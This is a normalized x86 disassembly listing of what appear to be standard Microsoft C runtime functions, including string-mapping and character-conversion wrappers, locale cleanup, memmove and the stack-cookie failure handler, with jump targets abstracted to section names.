sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4056bc
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_4058aa
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_403fc3
pop ecx
cmp eax ebx
je r-xdata
call sub_406ba0
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_4058aa
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_403fc3
pop ecx
cmp eax ebx
je r-xdata
call sub_406ba0
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_405ab1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4023eb
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4058ca
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_405af7
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4056bc
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_405830
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_4058aa
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_403fc3
pop ecx
cmp eax ebx
je r-xdata
call sub_406ba0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_405bde
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4023eb
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_405af7
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_405c1e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_4040eb
push [ esi + 0x8 ]
call sub_4040eb
push [ esi + 0xc ]
call sub_4040eb
push [ esi + 0x10 ]
call sub_4040eb
push [ esi + 0x14 ]
call sub_4040eb
push [ esi + 0x18 ]
call sub_4040eb
push [ esi ]
call sub_4040eb
push [ esi + 0x20 ]
call sub_4040eb
push [ esi + 0x24 ]
call sub_4040eb
push [ esi + 0x28 ]
call sub_4040eb
push [ esi + 0x2c ]
call sub_4040eb
push [ esi + 0x30 ]
call sub_4040eb
push [ esi + 0x34 ]
call sub_4040eb
push [ esi + 0x1c ]
call sub_4040eb
push [ esi + 0x38 ]
call sub_4040eb
push [ esi + 0x3c ]
call sub_4040eb
add esp 0x40
push [ esi + 0x40 ]
call sub_4040eb
push [ esi + 0x44 ]
call sub_4040eb
push [ esi + 0x48 ]
call sub_4040eb
push [ esi + 0x4c ]
call sub_4040eb
push [ esi + 0x50 ]
call sub_4040eb
push [ esi + 0x54 ]
call sub_4040eb
push [ esi + 0x58 ]
call sub_4040eb
push [ esi + 0x5c ]
call sub_4040eb
push [ esi + 0x60 ]
call sub_4040eb
push [ esi + 0x64 ]
call sub_4040eb
push [ esi + 0x68 ]
call sub_4040eb
push [ esi + 0x6c ]
call sub_4040eb
push [ esi + 0x70 ]
call sub_4040eb
push [ esi + 0x74 ]
call sub_4040eb
push [ esi + 0x78 ]
call sub_4040eb
push [ esi + 0x7c ]
call sub_4040eb
add esp 0x40
push [ esi + 0x80 ]
call sub_4040eb
push [ esi + 0x84 ]
call sub_4040eb
push [ esi + 0x88 ]
call sub_4040eb
push [ esi + 0x8c ]
call sub_4040eb
push [ esi + 0x90 ]
call sub_4040eb
push [ esi + 0x94 ]
call sub_4040eb
push [ esi + 0x98 ]
call sub_4040eb
push [ esi + 0x9c ]
call sub_4040eb
push [ esi + 0xa0 ]
call sub_4040eb
push [ esi + 0xa4 ]
call sub_4040eb
push [ esi + 0xa8 ]
call sub_4040eb
push [ esi + 0xbc ]
call sub_4040eb
push [ esi + 0xc0 ]
call sub_4040eb
push [ esi + 0xc4 ]
call sub_4040eb
push [ esi + 0xc8 ]
call sub_4040eb
push [ esi + 0xcc ]
call sub_4040eb
add esp 0x40
push [ esi + 0xd0 ]
call sub_4040eb
push [ esi + 0xb8 ]
call sub_4040eb
push [ esi + 0xd8 ]
call sub_4040eb
push [ esi + 0xdc ]
call sub_4040eb
push [ esi + 0xe0 ]
call sub_4040eb
push [ esi + 0xe4 ]
call sub_4040eb
push [ esi + 0xe8 ]
call sub_4040eb
push [ esi + 0xec ]
call sub_4040eb
push [ esi + 0xd4 ]
call sub_4040eb
push [ esi + 0xf0 ]
call sub_4040eb
push [ esi + 0xf4 ]
call sub_4040eb
push [ esi + 0xf8 ]
call sub_4040eb
push [ esi + 0xfc ]
call sub_4040eb
push [ esi + 0x100 ]
call sub_4040eb
push [ esi + 0x104 ]
call sub_4040eb
push [ esi + 0x108 ]
call sub_4040eb
add esp 0x40
push [ esi + 0x10c ]
call sub_4040eb
push [ esi + 0x110 ]
call sub_4040eb
push [ esi + 0x114 ]
call sub_4040eb
push [ esi + 0x118 ]
call sub_4040eb
push [ esi + 0x11c ]
call sub_4040eb
push [ esi + 0x120 ]
call sub_4040eb
push [ esi + 0x124 ]
call sub_4040eb
push [ esi + 0x128 ]
call sub_4040eb
push [ esi + 0x12c ]
call sub_4040eb
push [ esi + 0x130 ]
call sub_4040eb
push [ esi + 0x134 ]
call sub_4040eb
push [ esi + 0x138 ]
call sub_4040eb
push [ esi + 0x13c ]
call sub_4040eb
push [ esi + 0x140 ]
call sub_4040eb
push [ esi + 0x144 ]
call sub_4040eb
push [ esi + 0x148 ]
call sub_4040eb
add esp 0x40
push [ esi + 0x14c ]
call sub_4040eb
push [ esi + 0x150 ]
call sub_4040eb
push [ esi + 0x154 ]
call sub_4040eb
push [ esi + 0x158 ]
call sub_4040eb
push [ esi + 0x15c ]
call sub_4040eb
push [ esi + 0x160 ]
call sub_4040eb
add esp 0x18
sub_405f95
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4040eb
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_4040eb
pop ecx
push esi
call sub_4040eb
pop ecx
sub_405ffe
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4040eb
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4040eb
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_4040eb
pop ecx
push esi
call sub_4040eb
pop ecx
sub_4060fc
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
add ecx 0x2
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_40611c
call sub_405374
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_405381
pop ecx
push 0x3
call sub_402e0c
int3
push 0x1
push 0x40000015
push 0x3
call sub_404f92
add esp 0xc
sub_40614f
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_403a6c
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4056bc
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_4062bb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_40515f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_40515f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_40510d
mov eax esi
sub_406330
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_40515f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_40515f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_40510d
mov eax esi
jmp r-xdata
sub_4063fd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_406418
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_40515f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_40515f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_40510d
mov eax esi
sub_40647b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_40515f
mov [ eax ] 0x16
call sub_40510d
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_4064ba
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4023eb
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_406530
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4065b4 ]
jmp [ ecx * 4 + jump_table_406634 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4066a0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_40683c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_406740 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40683c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4066a0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40683c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4066a0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4066a0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4066a0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40683c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40683c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40683c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_40689a
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_406525
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_406525
pop ecx
sub_4069a0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4069c0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_4056bc
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_406a05
add esp 0x8
pop ebp
